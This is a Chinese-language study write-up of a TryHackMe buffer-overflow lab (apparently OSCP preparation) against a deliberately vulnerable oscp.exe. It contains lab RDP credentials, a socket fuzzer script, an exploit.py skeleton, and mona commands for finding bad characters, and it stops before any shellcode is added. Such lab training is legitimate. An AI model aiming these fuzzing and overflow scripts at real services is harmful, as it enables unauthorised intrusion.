TMH-缓冲区溢出学习

0x01 部署虚拟机

该房间使用预装了 Immunity Debugger 和 Putty 的 32 位 Windows 7 虚拟机。 Windows 防火墙和 Defender 均已被禁用，以使漏洞利用编写变得更加容易。

您可以使用 RDP 使用以下凭据登录计算机：admin/password

我建议使用 xfreerdp 命令： xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea

如果 Windows 提示您选择网络位置，请选择“主页”选项。

在您的桌面上应该有一个名为“vulnerable-apps”的文件夹。此文件夹内有许多二进制文件，这些二进制文件容易受到基于简单堆栈的缓冲区溢出的影响（PWK/OSCP 课程中教授的类型）：

  • The SLMail installer. SLMail 安装程序。
  • The brainpan binary. 脑盘二进制文件。
  • The dostackbufferoverflowgood binary.
    dostackbufferoverflowgood 二进制文件。
  • The vulnserver binary. vulnserver 二进制文件。
  • A custom written “oscp” binary which contains 10 buffer overflows, each with a different EIP offset and set of badchars.
    自定义编写的“oscp”二进制文件，其中包含 10 个缓冲区溢出，每个缓冲区溢出都有不同的 EIP 偏移量和一组 badchars。

我还在 mona 的帮助下编写了一份利用缓冲区溢出的便捷指南：https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst

请注意，这个房间不会从头开始教授缓冲区溢出。它旨在帮助 OSCP 学生，并让他们注意 mona 的一些功能，这将节省 OSCP 考试的时间。

0x02 oscp.exe-溢出1

右键单击桌面上的 Immunity Debugger 图标，然后选择“以管理员身份运行”。

当 Immunity 加载时，单击打开文件图标，或选择“文件”->“打开”。导航到管理员用户桌面上的存在漏洞的应用程序文件夹，然后导航到“oscp”文件夹。选择“oscp”（oscp.exe）二进制文件并单击“打开”。

二进制文件将以“暂停”状态打开，因此单击红色播放图标或选择“调试”->“运行”。在终端窗口中，oscp.exe 二进制文件应该正在运行，并告诉我们它正在侦听端口 1337。

在您的 Kali 盒子上，使用 netcat 连接到 10.10.152.153 上的端口 1337：

nc 10.10.152.153 1337

输入“帮助”并按 Enter 键。请注意，有 10 个不同的 OVERFLOW 命令，编号为 1 - 10。输入“OVERFLOW1 test”并按 Enter 键。响应应该是“OVERFLOW1 COMPLETE”。终止连接。

Mona Configuration

mona 脚本已预安装，但是为了更易于使用，您应该使用以下命令配置工作文件夹，您可以在 Immunity Debugger 窗口底部的命令输入框中运行该命令：

!mona config -set workingfolder c:\mona\%p

Fuzzing

在 Kali 盒子上创建一个名为 fuzzer.py 的文件，其中包含以下内容：

#!/usr/bin/env python3
import socket, time, sys

ip = "10.10.152.153"
port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    #AF_INET常量用于指定IPv4地址族，SOCK_STREAM常量用于指定流式套接字
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
    	# 参数是一个元组
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)

使用 python 运行 fuzzer.py 脚本： python3 fuzzer.py ——顾名思义，就是用来验证目标服务是否存在缓冲区溢出漏洞的

模糊器将发送越来越长的由 As 组成的字符串。如果模糊器使用其中一个字符串使服务器崩溃，则模糊器应退出并显示错误消息。记下发送的最大字节数（2000 bytes）

Crash Replication & Controlling EIP

学一下什么是EIP

在PWN学中，EIP代表Extended Instruction Pointer（扩展指令指针）。

EIP是x86体系结构中的一个寄存器，它存储着下一条将要执行的指令的内存地址。它在程序执行期间不断更新，指向即将执行的指令。

在二进制漏洞利用中，攻击者通常试图控制EIP寄存器的值，以便改变程序的执行流程。通过成功地控制EIP寄存器，攻击者可以将程序的控制流转移到攻击者精心构造的恶意代码上，实现执行任意代码的目的。

常见的漏洞类型，如缓冲区溢出、格式化字符串漏洞等，可以导致EIP被覆盖或劫持，从而控制程序的执行流程。攻击者通常通过在缓冲区中注入恶意数据来改变EIP的值，将其指向攻击者指定的内存地址，以执行恶意代码。

因此，EIP在PWN学中是一个重要的概念，攻击者需要了解和利用它来实现二进制漏洞的利用和攻击。

在您的 Kali 盒子上创建另一个名为exploit.py 的文件，其中包含以下内容：

import socket

ip = "10.10.152.153"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

Finding Bad Characters

使用 mona 生成字节数组，并默认排除空字节 (\x00)。请注意生成的 bytearray.bin 文件的位置（如果根据本指南的 Mona 配置部分设置工作文件夹，则该位置应为 C:\mona\oscp\bytearray.bin）。

!mona bytearray -b "\x00"

现在生成一个与字节数组相同的坏字符字符串。以下 python 脚本可用于生成从 \x01 到 \xff 的坏字符字符串：

for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
`"{:02x}".format(x)`是一个格式化字符串的语法，用于将整数`x`格式化为两位的十六进制数，并在不足两位时使用前导零进行填充。让我们逐个解释其中的每个部分：

- `{}` 是格式化字符串中的占位符，它表示将要插入一个值。
- `:02` 是格式规范，指定了对应的值的格式。
  - `:` 表示格式规范的开始。
  - `02` 表示将值格式化为两位宽度。如果值不足两位，则使用前导零进行填充。
- `x` 是格式规范的一部分，表示将值格式化为十六进制数。

因此，`"{:02x}".format(x)`中的`x`表示将整数`x`转换为两位的十六进制数，如果不足两位则用前导零填充。以下是一些示例：

- 当`x`的值为10时，`"{:02x}".format(x)`将生成字符串`"0a"`。
- 当`x`的值为255时，`"{:02x}".format(x)`将生成字符串`"ff"`。

在给定示例代码中，循环迭代的每个整数`x`都会通过`"{:02x}".format(x)`进行格式化，生成对应的两位十六进制数的字符串表示。这些字符串将被拼接并打印出来，形成从1到255的所有字节的十六进制转义序列。

更新您的exploit.py 脚本并将payload 变量设置为脚本生成的坏字符字符串。

重新启动Immunity中的oscp.exe并再次运行修改后的exploit.py脚本。记下 ESP 寄存器指向的地址，并在以下 mona 命令中使用它：

!mona compare -f C:\mona\oscp\bytearray.bin -a <address>

应出现一个弹出窗口，标有“mona 内存比较结果”。如果没有，请使用“窗口”菜单切换到它。该窗口显示比较结果，指示内存中与生成的 bytearray.bin 文件中的字符不同的任何字符。

并非所有这些都可能是坏字符！有时，坏字符也会导致下一个字节被损坏，甚至影响字符串的其余部分。

列表中的第一个 badchar 应该是空字节 (\x00)，因为我们已经从文件中删除了它。记下任何其他内容。在 mona 中生成一个新的字节数组，并指定这些新的 badchars 和 \x00。然后更新exploit.py 脚本中的payload 变量并删除新的badchars。

重新启动Immunity中的oscp.exe并再次运行修改后的exploit.py脚本。重复 badchar 比较，直到结果状态返回“未修改”。这表明不再存在 badchars。
